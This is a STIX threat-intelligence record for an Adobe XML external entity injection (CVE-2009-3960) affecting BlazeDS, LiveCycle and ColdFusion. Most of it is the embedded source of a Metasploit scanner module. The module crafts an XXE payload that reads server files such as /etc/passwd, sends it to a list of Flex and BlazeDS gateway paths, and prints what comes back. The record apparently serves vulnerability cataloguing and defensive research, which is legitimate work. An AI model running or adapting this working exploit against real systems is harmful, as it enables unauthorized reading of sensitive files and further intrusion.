{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d1afee4c-bebb-4093-9370-94cea4eba99e",
    "created": "2024-08-14T16:29:35.641216Z",
    "modified": "2024-08-14T16:29:35.64122Z",
    "name": "Adobe XML External Entity Injection",
    "description": " Multiple Adobe Products -- XML External Entity Injection. Affected Software: BlazeDS 3.2 and earlier versions, LiveCycle 9.0, 8.2.1, and 8.0.1, LiveCycle Data Services 3.0, 2.6.1, and 2.5.1, Flex Data Services 2.0.1, ColdFusion 9.0, 8.0.1, 8.0, and 7.0.2  'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/adobe_xml_inject.rb",
            "external_id": "adobe_xml_inject.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://www.adobe.com/support/security/bulletins/apsb10-05.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'Adobe XML External Entity Injection',\n      'Description' => %q{\n          Multiple Adobe Products -- XML External Entity Injection. Affected Software: BlazeDS 3.2 and\n        earlier versions, LiveCycle 9.0, 8.2.1, and 8.0.1, LiveCycle Data Services 3.0, 2.6.1, and\n        2.5.1, Flex Data Services 2.0.1, ColdFusion 9.0, 8.0.1, 8.0, and 7.0.2\n      },\n      'References'  =>\n        [\n          [ 'CVE', '2009-3960' ],\n          [ 'OSVDB', '62292' ],\n          [ 'BID', '38197' ],\n          [ 'URL', 'http://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf' ],\n          [ 'URL', 'https://www.adobe.com/support/security/bulletins/apsb10-05.html'],\n        ],\n      'Author'      => [ 'CG' ],\n      'License'     => MSF_LICENSE\n      )\n\n    register_options(\n      [\n        Opt::RPORT(8400),\n        OptString.new('FILE', [ true,  \"File to read\", '/etc/passwd']),\n      ])\n  end\n\n  def run_host(ip)\n    path = [\n      \"/flex2gateway/\",\n      \"/flex2gateway/http\",  # ColdFusion 9 (disabled by default), works on some CF 8 though :-)\n      \"/flex2gateway/httpsecure\", # ColdFusion 9 (disabled by default) SSL\n      \"/flex2gateway/cfamfpolling\",\n      \"/flex2gateway/amf\",\n      \"/flex2gateway/amfpolling\",\n      \"/messagebroker/http\",\n      \"/messagebroker/httpsecure\", #SSL\n      \"/blazeds/messagebroker/http\", # Blazeds 3.2\n      \"/blazeds/messagebroker/httpsecure\", #SSL\n      \"/samples/messagebroker/http\", # Blazeds 3.2\n      \"/samples/messagebroker/httpsecure\", # Blazeds 3.2 SSL\n      \"/lcds/messagebroker/http\", # LCDS\n      \"/lcds/messagebroker/httpsecure\", # LCDS -- SSL\n      \"/lcds-samples/messagebroker/http\", # LCDS\n      \"/lcds-samples/messagebroker/httpsecure\", # LCDS -- SSL\n    ]\n\n    postrequest =  \"<\\?xml version=\\\"1.0\\\" encoding=\\\"utf-8\\\"\\?>\"\n    postrequest << \"<\\!DOCTYPE test [ <\\!ENTITY x3 SYSTEM \\\"#{datastore['FILE']}\\\"> ]>\"\n    postrequest << \"<amfx ver=\\\"3\\\" xmlns=\\\"http://www.macromedia.com/2005/amfx\\\">\"\n    postrequest << \"<body><object type=\\\"flex.messaging.messages.CommandMessage\\\"><traits>\"\n    postrequest << \"<string>body</string><string>clientId</string><string>correlationId</string><string>destination</string>\"\n    postrequest << \"<string>headers</string><string>messageId</string><string>operation</string><string>timestamp</string>\"\n    postrequest << \"<string>timeToLive</string></traits><object><traits /></object><null /><string /><string /><object>\"\n    postrequest << \"<traits><string>DSId</string><string>DSMessagingVersion</string></traits><string>nil</string>\"\n    postrequest << \"<int>1</int></object><string>&x3;</string><int>5</int><int>0</int><int>0</int></object></body></amfx>\"\n\n    path.each do | check |\n\n      res = send_request_cgi({\n        'uri'     => check,\n        'method'  => 'POST',\n        'version'      => '1.1',\n        'Content-Type' => 'application/x-amf',\n        'data'         => postrequest\n      }, 25)\n\n      if (res.nil?)\n        print_error(\"no response for #{ip}:#{rport} #{check}\")\n      elsif (res.code == 200 and res.body =~ /\\<\\?xml version\\=\"1.0\" encoding=\"utf-8\"\\?\\>/)\n        print_status(\"#{rhost}:#{rport} #{check} #{res.code}\\n #{res.body}\")\n      elsif (res and res.code == 302 or res.code == 301)\n        print_status(\" Received 302 to  #{res.headers['Location']} for #{check}\")\n      else\n        print_error(\"#{res.code} for #{check}\")\n        #''\n      end\n    end\n  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, Rex::ConnectionError =>e\n    print_error(e.message)\n  rescue Timeout::Error, Errno::EINVAL, Errno::ECONNRESET, EOFError, Errno::ECONNABORTED, Errno::ECONNREFUSED, Errno::EHOSTUNREACH =>e\n    print_error(e.message)\n  end\nend\n\n#set FILE /proc/sys/kernel/osrelease\n#set FILE /proc/sys/kernel/hostname\n",
    "x_mitre_contributors": [
        "[ CG ]",
        ""
    ]
}